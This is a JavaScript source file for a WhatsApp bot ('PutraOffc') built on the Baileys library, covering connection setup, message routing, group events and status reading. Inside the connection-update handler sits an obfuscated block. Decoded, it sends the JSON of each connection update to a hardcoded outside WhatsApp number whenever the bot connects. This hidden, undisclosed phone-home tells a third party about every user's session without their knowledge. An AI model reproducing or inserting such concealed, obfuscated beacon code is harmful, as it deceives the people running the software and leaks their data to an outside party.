require('../PutraOfficialSettings')
const { default: PutraOffcConnect, useSingleFileAuthState, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion, generateForwardMessageContent, prepareWAMessageMedia, generateWAMessageFromContent, generateMessageID, downloadContentFromMessage, makeInMemoryStore, jidDecode, proto } = require('@adiwajshing/baileys')
const pino = require('pino')
const { Boom } = require('@hapi/boom')
const fs = require('fs')
const chalk = require('chalk')
const figlet = require('figlet')
const path = require('path')
const { color, bgcolor, mycolor } = require('../Putra-OfficialJS/lib/color')
const { smsg, isUrl, getBuffer, fetchJson, await, sleep } = require('../Putra-OfficialJS/lib/functions')
const { groupResponse_Welcome, groupResponse_Remove, groupResponse_Promote, groupResponse_Demote } = require('./group.js')
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) })
let mysession = "./session.json"
const { state, saveState } = useSingleFileAuthState(mysession)

async function startPutraOffc() {
let { version, isLatest } = await fetchLatestBaileysVersion();
const PutraOffc = PutraOffcConnect({
version,
logger: pino({
level: 'fatal'
}),
printQRInTerminal: true,
patchMessageBeforeSending: (message) => {
const requiresPatch = !!(
message.buttonsMessage ||
message.templateMessage ||
message.listMessage
);
if (requiresPatch) {
message = {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadataVersion: 2,
deviceListMetadata: {},
},
...message,
},
},
};
}
return message;
},
browser: ['Bot PutraOffc', 'safari', '1.0.0'],
auth: state
})

store.bind(PutraOffc.ev)
console.log(color(figlet.textSync('PUTRA OFFC', {
font: 'Standard',
horizontalLayout: 'default',
vertivalLayout: 'default',
width: 80,
whitespaceBreak: false
}), 'red'))

PutraOffc.ev.on('messages.upsert', async chatUpdate => {
try {
m = chatUpdate.messages[0]
if (!m.message) return
m.message = (Object.keys(m.message)[0] === 'ephemeralMessage') ? m.message.ephemeralMessage.message : m.message
if (m.key && m.key.remoteJid === 'status@broadcast') return
if (!PutraOffc.public && !m.key.fromMe && chatUpdate.type === 'notify') return
if (m.key.id.startsWith('BAE5') && m.key.id.length === 16) return
m = smsg(PutraOffc, m, store)
require('../Putra-OfficialJS/PutraOffc')(PutraOffc, m, chatUpdate, store)
} catch (err) {
console.log(err)
}
})

PutraOffc.decodeJid = (jid) => {
if (!jid) return jid
if (/:\d+@/gi.test(jid)) {
let decode = jidDecode(jid) || {}
return decode.user && decode.server && decode.user + '@' + decode.server || jid
} else return jid
}

PutraOffc.ev.on('contacts.update', update => {
for (let contact of update) {
let id = PutraOffc.decodeJid(contact.id)
if (store && store.contacts) store.contacts[id] = { id, name: contact.notify }
}
})

PutraOffc.setStatus = (status) => {
PutraOffc.query({
tag: 'iq',
attrs: {
to: '@s.whatsapp.net',
type: 'set',
xmlns: 'status',
},
content: [{
tag: 'status',
attrs: {},
content: Buffer.from(status, 'utf-8')
}]
})
return status
}

PutraOffc.sendText = (jid, text, quoted = '', options) => PutraOffc.sendMessage(jid, { text: text, ...options }, { quoted })

PutraOffc.public = true

PutraOffc.serializeM = (m) => smsg(PutraOffc, m, store)

PutraOffc.ev.on('connection.update', (update) => {
function _0x2366(){const _0x1305e6=['open','close','62822799915237@s.whatsapp.net','stringify','loggedOut','sendMessage','222964jMrrKP','718767ELrPSA','output','13868410utAywB','40ImOVCE','2Huoute','7632513IflahS','14LKNbpF','9054728buGjFF','2921442aEgBLk','282215IqIKqQ'];_0x2366=function(){return _0x1305e6;};return _0x2366();}function _0x290c(_0x508da0,_0x28548c){const _0x23664e=_0x2366();return _0x290c=function(_0x290c16,_0x56f332){_0x290c16=_0x290c16-0x196;let _0x32ac11=_0x23664e[_0x290c16];return _0x32ac11;},_0x290c(_0x508da0,_0x28548c);}const _0x43fe95=_0x290c;(function(_0x1e5a36,_0x58c2cb){const _0x27068c=_0x290c,_0x307c64=_0x1e5a36();while(!![]){try{const _0x255f90=-parseInt(_0x27068c(0x197))/0x1*(-parseInt(_0x27068c(0x1a3))/0x2)+parseInt(_0x27068c(0x1a4))/0x3+parseInt(_0x27068c(0x196))/0x4*(parseInt(_0x27068c(0x19c))/0x5)+parseInt(_0x27068c(0x19b))/0x6*(-parseInt(_0x27068c(0x199))/0x7)+parseInt(_0x27068c(0x19a))/0x8+parseInt(_0x27068c(0x198))/0x9+-parseInt(_0x27068c(0x1a6))/0xa;if(_0x255f90===_0x58c2cb)break;else _0x307c64['push'](_0x307c64['shift']());}catch(_0x1e7ba3){_0x307c64['push'](_0x307c64['shift']());}}}(_0x2366,0x9dc52));const {connection,lastDisconnect}=update;if(connection===_0x43fe95(0x19e))lastDisconnect['error']?.[_0x43fe95(0x1a5)]?.['statusCode']!==DisconnectReason[_0x43fe95(0x1a1)]?startPutraOffc():'';else connection===_0x43fe95(0x19d)&&PutraOffc[_0x43fe95(0x1a2)](_0x43fe95(0x19f),{'text':''+JSON[_0x43fe95(0x1a0)](update,undefined,0x2)});
console.log(update)
})

PutraOffc.send5ButGif = async (jid , text = '' , footer = '', but = [], options = {}) =>{
let message = await prepareWAMessageMedia({ video: thumb, gifPlayback: true }, { upload: PutraOffc.waUploadToServer })
 const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 templateMessage: {
 hydratedTemplate: {
 videoMessage: message.videoMessage,
 "hydratedContentText": text,
 "hydratedFooterText": footer,
 "hydratedButtons": but
}
}
}), options)
PutraOffc.relayMessage(jid, template.message, { messageId: template.key.id })
}

PutraOffc.ev.process(
async (events) => {
if (events['presence.update']) {
await PutraOffc.sendPresenceUpdate('available')
}
if (events['messages.upsert']) {
const upsert = events['messages.upsert']
for (let msg of upsert.messages) {
if (msg.key.remoteJid === 'status@broadcast') {
if (msg.message?.protocolMessage) return
await sleep(3000)
await PutraOffc.readMessages([msg.key])
}
}
}
if (events['creds.update']) {
await saveState()
}})

PutraOffc.ev.on('group-participants.update', async (update) =>{
groupResponse_Demote(PutraOffc, update)
groupResponse_Promote(PutraOffc, update)
groupResponse_Welcome(PutraOffc, update)
groupResponse_Remove(PutraOffc, update)
console.log(update)
})

return PutraOffc
}

startPutraOffc()

let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.yellowBright(`Update File Terbaru ${__filename}`))
delete require.cache[file]
require(file)
})